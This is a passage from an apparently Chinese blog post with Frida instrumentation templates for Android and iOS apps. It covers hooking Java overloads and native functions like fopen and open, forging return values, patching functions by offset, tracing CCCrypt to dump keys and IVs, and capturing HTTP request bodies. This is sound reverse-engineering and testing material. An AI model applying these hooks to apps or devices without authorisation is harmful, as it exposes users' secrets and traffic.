class="hljs-string">&quot;HOOK包名&quot;</span>)<br><span class="hljs-comment">#创建js脚本</span><br>script = process.create_script(jscode)<br><span class="hljs-comment">#注入js脚本</span><br>script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running&#x27;</span>)<br>script.load()<br>sys.stdin.read()<br><br></code></pre></td></tr></table></figure><h3 id="HOOK-native层方法模版"><a href="#HOOK-native层方法模版" class="headerlink" title="HOOK native层方法模版"></a>HOOK native层方法模版</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida, sys<br><br><span class="hljs-comment">#接收js脚本send方法传入的数据</span><br><span class="hljs-comment">#@message数据类型为字典</span><br><span class="hljs-comment">#&#123;&#x27;type&#x27;:&#x27;send&#x27;,&#x27;payload&#x27;:&#x27;js脚本发送的数据&#x27;&#125;</span><br><span class="hljs-comment">#@data数据类型为byte</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_message</span>(<span class="hljs-params">message, data</span>):</span><br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">setImmediate(function() &#123;</span><br><span class="hljs-string">#Interceptor.attach方法需要两个参数 1.NativePointer指针 2.回调方</span><br><span class="hljs-string">Interceptor.attach(Module.findExportByName(&quot;.so文件&quot; , &quot;导出方法&quot;), &#123;</span><br><span class="hljs-string">    onEnter: function(args) &#123;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        send(&#x27;此消息发送给on_message方法&#x27;);</span><br><span class="hljs-string">    &#125;,</span><br><span class="hljs-string">    onLeave:function(retval)&#123;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment">#重启应用并附加到运行中的应用的进程中</span><br><span class="hljs-comment">#pid=frida.get_usb_device().spawn([&#x27;包名&#x27;])</span><br><span class="hljs-comment">#process = frida.get_usb_device().attach(pid)</span><br><br><span class="hljs-comment">#附加到运行中的应用的进程中</span><br>process = frida.get_usb_device().attach(<span class="hljs-string">&quot;HOOK包名&quot;</span>)<br><span class="hljs-comment">#创建js脚本</span><br>script = process.create_script(jscode)<br><span class="hljs-comment">#注入js脚本</span><br>script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running&#x27;</span>)<br>script.load()<br>sys.stdin.read()<br><br></code></pre></td></tr></table></figure><h3 id="HOOK重载方法"><a href="#HOOK重载方法" class="headerlink" title="HOOK重载方法"></a>HOOK重载方法</h3><h4 id="1-apply-arguments"><a href="#1-apply-arguments" class="headerlink" title="1. apply arguments"></a>1. apply arguments</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">MyClass.MyFunc.overload(<span class="hljs-string">&quot;java.util.List&quot;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.MyFunc.overload(<span class="hljs-string">&quot;java.util.List&quot;</span>).apply(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">arguments</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-argments下标"><a href="#2-argments下标" class="headerlink" title="2. argments下标"></a>2. argments下标</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">MyClass.MyFunc.overload(<span class="hljs-string">&quot;java.util.List&quot;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.MyFunc(<span class="hljs-built_in">arguments</span>[<span class="hljs-number">0</span>]);<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="3-使用具体参数"><a href="#3-使用具体参数" class="headerlink" title="3. 使用具体参数"></a>3. 使用具体参数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">MyClass.MyFuncs.overload(<span class="hljs-string">&quot;int&quot;</span>, <span class="hljs-string">&quot;int&quot;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">s1, s2</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> ret = <span class="hljs-built_in">this</span>.MyFuncs(s1, s2);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-call"><a href="#4-call" class="headerlink" title="4. call"></a>4. call</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> Handler = classFactory.use(<span class="hljs-string">&quot;android.os.Handler&quot;</span>);<br><span class="hljs-keyword">var</span> Looper = classFactory.use(<span class="hljs-string">&quot;android.os.Looper&quot;</span>);<br><br><span class="hljs-keyword">var</span> looper = Looper.getMainLooper();<br><span class="hljs-keyword">var</span> handler = Handler.$new.overload(<span class="hljs-string">&quot;android.os.Looper&quot;</span>).call(Handler, looper);<br><br><br>MyClass.MyFunc.overload(<span class="hljs-string">&quot;java.lang.String;&quot;</span>).implementation = &#123;<br>     <span class="hljs-built_in">this</span>.MyFunc.overload(<span class="hljs-string">&quot;java.lang.String&quot;</span>).call(<span class="hljs-built_in">this</span>, args[<span class="hljs-number">1</span>])<br>     MyClass.MyFunc.overload(<span class="hljs-string">&quot;java.lang.String&quot;</span>).call()<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="拦截系统fopen函数"><a href="#拦截系统fopen函数" class="headerlink" title="拦截系统fopen函数"></a>拦截系统fopen函数</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">FILE</span> *fopen(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode)<br></code></pre></td></tr></table></figure><p>使用给定的模式 mode 打开 filename 所指向的文件。文件如果打开成功，会返回一个指针，相当于句柄，如果文件打开失败则返回 0。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">Interceptor.attach(Module.findExportByName(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;fopen&quot;</span>), &#123;<br>    <br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (!args[<span class="hljs-number">0</span>].isNull())&#123;<br>               <span class="hljs-keyword">var</span> path = args[<span class="hljs-number">0</span>].readUtf8String();<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;fopen &quot;</span> + path); <br>            &#125;<br>           <br>        &#125;,<br>            <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) </span>&#123;<br>  <br>                    retval.replace(<span class="hljs-number">0</span>);  <span class="hljs-comment">//将返回值替换成0</span><br>           <br>            &#125;,<br>    &#125;)<br></code></pre></td></tr></table></figure><h3 id="拦截自定义函数"><a href="#拦截自定义函数" class="headerlink" title="拦截自定义函数"></a>拦截自定义函数</h3><p>自定义一个 getEncryptKey 函数，返回的参数是一个字符串指针，我们在 onLeave 函数中添加下面的代码，分配内存并填充字符串 123456，最终替换返回值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">Interceptor.attach(Module.findExportByName(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;getEncryptKey&quot;</span>), &#123;<br><br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) </span>&#123;<br>                <br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;getEncryptKey onLeave&quot;</span>); <br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] retval:&quot;</span> + retval.readUtf8String());<br>                <span class="hljs-keyword">var</span> string = Memory.allocUtf8String(<span class="hljs-string">&quot;1234567&quot;</span>); <span class="hljs-comment">//分配内存并填充数据</span><br>                retval.replace(string); <span class="hljs-comment">//替换</span><br><br>        &#125;,<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="修改C函数执行流程"><a href="#修改C函数执行流程" class="headerlink" title="修改C函数执行流程"></a>修改C函数执行流程</h3><p>以修改open方法为例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> openPtr = Module.getExportByName(<span class="hljs-literal">null</span>, <span class="hljs-string">&#x27;open&#x27;</span>);  <span class="hljs-comment">//获取open方法地址</span><br><span class="hljs-keyword">var</span> open = <span class="hljs-keyword">new</span> NativeFunction(openPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]); <span class="hljs-comment">//创建方法</span><br>Interceptor.replace(openPtr, <span class="hljs-keyword">new</span> NativeCallback(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">pathPtr, flags</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> path = pathPtr.readUtf8String();<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;[*]path: &#x27;</span> + path);<br>    <span class="hljs-keyword">var</span> fd = open(pathPtr, flags);<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;[*]fd:&#x27;</span> + fd);<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>])); <span class="hljs-comment">//替换方法</span><br></code></pre></td></tr></table></figure><p>以修改fopen方法为例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> fopenAddr = Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>);<br><br><span class="hljs-comment">//FILE* fopen(const char* __path, const char* __mode);</span><br><br><span class="hljs-keyword">var</span> func_c_fopen = <span class="hljs-keyword">new</span> NativeFunction(fopenAddr,<span class="hljs-string">&quot;pointer&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>]);<br><br>Interceptor.replace(fopenAddr,<span class="hljs-keyword">new</span> NativeCallback(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">path,mode</span>) </span>&#123;<br><br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;替换&quot;</span>);<br>    <span class="hljs-built_in">console</span>.error(path,Memory.readCString(path),<span class="hljs-string">&quot;mode:&quot;</span>,Memory.readCString(mode));<br><br>    <span class="hljs-keyword">var</span> newPtr = Memory.allocUtf8String(<span class="hljs-string">&quot;/data/local/tmp/js/app.js&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> func_c_fopen(newPtr,mode)<br><br>&#125;,<span class="hljs-string">&quot;pointer&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>]));<br></code></pre></td></tr></table></figure><h3 id="拦截-sub-xxxx-函数"><a href="#拦截-sub-xxxx-函数" class="headerlink" title="拦截 sub_xxxx 函数"></a>拦截 sub_xxxx 函数</h3><p>通过指针去HOOK，首先通过IDA获取到方法的偏移地址，也就是sub后面的十六进制</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//如果thumb指令需要将偏移地址+1</span><br>Interceptor.attach(Module.findBaseAddress(<span class="hljs-string">&quot;libc.so&quot;</span>).add(<span class="hljs-number">0x1A45</span>), &#123;<br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>          &#125;<br> &#125;);<br></code></pre></td></tr></table></figure><h3 id="HOOK-OC"><a href="#HOOK-OC" class="headerlink" title="HOOK OC"></a>HOOK OC</h3><h4 id="1-拦截自定义方法"><a href="#1-拦截自定义方法" class="headerlink" title="1. 拦截自定义方法"></a>1. 拦截自定义方法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> method = ObjC.classes.类[<span class="hljs-string">&#x27;+/- 方法名&#x27;</span>];<br><span class="hljs-keyword">var</span> origImp = method.implementation; <br>method.implementation = ObjC.implement(method, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">self,selector</span>)</span>&#123;  <br> <br>      <span class="hljs-keyword">return</span> origImp(self,selector);    <br>    <br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="2-拦截NSString"><a href="#2-拦截NSString" class="headerlink" title="2. 拦截NSString"></a>2. 拦截NSString</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">frida-<span class="hljs-built_in">trace</span> -U -m <span class="hljs-string">&quot;+[NSURL URLWithString:]&quot;</span> xxx<br></code></pre></td></tr></table></figure><p>frida会自动在当前文件夹<code>__handlers__    </code>下生成js脚本，编辑并填写以下代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">onEnter: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">log, args, state</span>) </span>&#123;<br>    log(<span class="hljs-string">&quot;+[NSURL URLWithString:&quot;</span> + args[<span class="hljs-number">2</span>] + <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">var</span> objcNSString = ObjC.Object(args[<span class="hljs-number">2</span>]);  <span class="hljs-comment">//将指针转为Objective-C 对象 NSString</span><br>    <span class="hljs-keyword">var</span> strObjcNSString = objcNSString.UTF8String(); <br>    log(<span class="hljs-string">&quot;+[NSURL URLWithString] str: &quot;</span> + strObjcNSString);    <br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="3-拦截NSMutableURLRequest"><a href="#3-拦截NSMutableURLRequest" class="headerlink" title="3.拦截NSMutableURLRequest"></a>3.拦截NSMutableURLRequest</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">frida-<span class="hljs-built_in">trace</span> -U -m <span class="hljs-string">&quot;-[NSURLRequest setHTTPBody:]&quot;</span> -m <span class="hljs-string">&quot;-[NSMutableURLRequest setHTTPBody:]&quot;</span> xxx<br></code></pre></td></tr></table></figure><p>找到 NSMutableURLRequest_setHTTPBody.js 修改成如下代码，可以看到调用 NSData 的 bytes 函数得到内存地址，然后再调用 readUtf8String 读取内存中的数据，即可得到字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">onEnter: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">log, args, state</span>) </span>&#123;<br>    log(<span class="hljs-string">&quot;-[NSMutableURLRequest setHTTPBody:&quot;</span> + args[<span class="hljs-number">2</span>] + <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">var</span> objcData = ObjC.Object(args[<span class="hljs-number">2</span>]); <span class="hljs-comment">//NSData</span><br>    <span class="hljs-keyword">var</span> strBody = objcData.bytes().readUtf8String(objcData.length()); <span class="hljs-comment">//NSData 转换成 string</span><br>    log(<span class="hljs-string">&quot;[NSMutableURLRequest setHTTPBody data: &quot;</span> + strBody);<br>  &#125;,<br></code></pre></td></tr></table></figure><h4 id="4-遍历-NSArray"><a href="#4-遍历-NSArray" class="headerlink" title="4. 遍历 NSArray"></a>4. 遍历 NSArray</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> array = <span class="hljs-keyword">new</span> ObjC.Object(args[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">var</span> count = array.count().valueOf();<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i !== count; i++) &#123;<br>  <span class="hljs-keyword">var</span> element = array.objectAtIndex_(i);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-遍历-NSDictionary"><a href="#5-遍历-NSDictionary" class="headerlink" title="5. 遍历 NSDictionary"></a>5. 遍历 NSDictionary</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> dict = <span class="hljs-keyword">new</span> ObjC.Object(args[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">var</span> enumerator = dict.keyEnumerator();<br><span class="hljs-keyword">var</span> key;<br><span class="hljs-keyword">while</span> ((key = enumerator.nextObject()) !== <span class="hljs-literal">null</span>) &#123;<br>  <span class="hljs-keyword">var</span> value = dict.objectForKey_(key);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-通配符跟踪方法"><a href="#6-通配符跟踪方法" class="headerlink" title="6. 通配符跟踪方法"></a>6. 通配符跟踪方法</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">frida-<span class="hljs-built_in">trace</span> -U -m <span class="hljs-string">&quot;-[Home* *]&quot;</span> Twitter<br></code></pre></td></tr></table></figure><h4 id="7-跟踪CCCrypt"><a href="#7-跟踪CCCrypt" class="headerlink" title="7. 跟踪CCCrypt"></a>7. 跟踪CCCrypt</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">frida-trace -U -<span class="hljs-selector-tag">i</span> CCCrypt xxx<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">log, args, state</span>) </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     operation   = args[0]</span><br><span class="hljs-comment">     CCAlgorithm = args[1]</span><br><span class="hljs-comment">     CCOptions   = args[2]</span><br><span class="hljs-comment">     keyBytes    = args[3]</span><br><span class="hljs-comment">     keyLength   = args[4]</span><br><span class="hljs-comment">   ivBuffer    = args[5]</span><br><span class="hljs-comment">     inBuffer    = args[6]</span><br><span class="hljs-comment">     inLength    = args[7]</span><br><span class="hljs-comment">    outBuffer   = args[8]</span><br><span class="hljs-comment">     outLength   = args[9]</span><br><span class="hljs-comment">     outCountPtr = args[10]    </span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.operation == <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">//0代表加密</span><br>       <span class="hljs-comment">//解密前明文</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;input:&quot;</span>)<br>        <span class="hljs-built_in">console</span>.log(hexdump(ptr(args[<span class="hljs-number">6</span>]), &#123;<br>            <span class="hljs-attr">length</span>: args[<span class="hljs-number">7</span>].toInt32(),<br>            <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">ansi</span>: <span class="hljs-literal">true</span><br>        &#125;))<br>        <span class="hljs-comment">//密钥</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Key: &quot;</span>)<br>        <span class="hljs-built_in">console</span>.log(hexdump(ptr(args[<span class="hljs-number">3</span>]), &#123;<br>            <span class="hljs-attr">length</span>: args[<span class="hljs-number">4</span>].toInt32(),<br>            <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">ansi</span>: <span class="hljs-literal">true</span><br>        &#125;))<br>        <span class="hljs-comment">//IV</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;IV: &quot;</span>)<br>        <span class="hljs-built_in">console</span>.log(hexdump(ptr( args[<span class="hljs-number">5</span>]), &#123;<br>            <span class="hljs-attr">length</span>: args[<span class="hljs-number">4</span>].toInt32(),<br>            <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">ansi</span>: <span class="hljs-literal">true</span><br>        &#125;))<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>拦截URWithString</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> className = <span class="hljs-string">&quot;NSURL&quot;</span>;<br><span class="hljs-keyword">var</span> funcName = <span class="hljs-string">&quot;+ URLWithString:&quot;</span>;<br><span class="hljs-keyword">var</span> hook = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;ObjC.classes.&#x27;</span> + className + <span class="hljs-string">&#x27;[&quot;&#x27;</span> + funcName + <span class="hljs-string">&#x27;&quot;]&#x27;</span>);<br>Interceptor.attach(hook.implementation, &#123;<br>   <br><br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)</span>&#123;<br><br>                <span class="hljs-keyword">var</span> className = ObjC.Object(args[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">var</span> methodName = args[<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">var</span> urlString = ObjC.Object(args[<span class="hljs-number">2</span>]);<br><br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;className: &quot;</span> + className.toString());<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;methodName: &quot;</span> + methodName.readUtf8String());<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;urlString: &quot;</span> + urlString.toString());<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;-----------------------------------------&quot;</span>);<br><br>                urlString = ObjC.classes.NSString.stringWithString_(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;newUrlString: &quot;</span> + urlString.toString());<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;-----------------------------------------&quot;</span>);<br><br>        &#125;,<br><br>     <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) </span>&#123;<br><br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] Class Name: &quot;</span> + className);<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] Method Name: &quot;</span> + funcName);<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;\t[-] Type of return value: &quot;</span> + <span class="hljs-keyword">typeof</span> retval);<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;\t[-] Original Return Value: &quot;</span> + retval);<br>        &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>有时候被拦截的函数调用的次数较多，打印的信息也会较多，我们需要保存成文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/var/mobile/log.txt&quot;</span>,<span class="hljs-string">&quot;a+&quot;</span>);<span class="hljs-comment">//a+表示追加内容，和c语言的fopen函数模式类似</span><br>file.write(<span class="hljs-string">&quot;logInfo&quot;</span>);<br>file.flush();<br>file.close();<br></code></pre></td></tr></table></figure><h4 id="8-API查找器和拦截器的组合使用实现批量HOOK"><a href="#8-API查找器和拦截器的组合使用实现批量HOOK" class="headerlink" title="8. API查找器和拦截器的组合使用实现批量HOOK"></a>8. API查找器和拦截器的组合使用实现批量HOOK</h4><p>API查找器支持对 Objective-C 方法和 C 函数的查找，比如我们来写一个找到 NSFileManager 这个类名下的所有方法。新建一个 ApiResolver，如果查找 Objective-C，ApiResolver 参数中填写 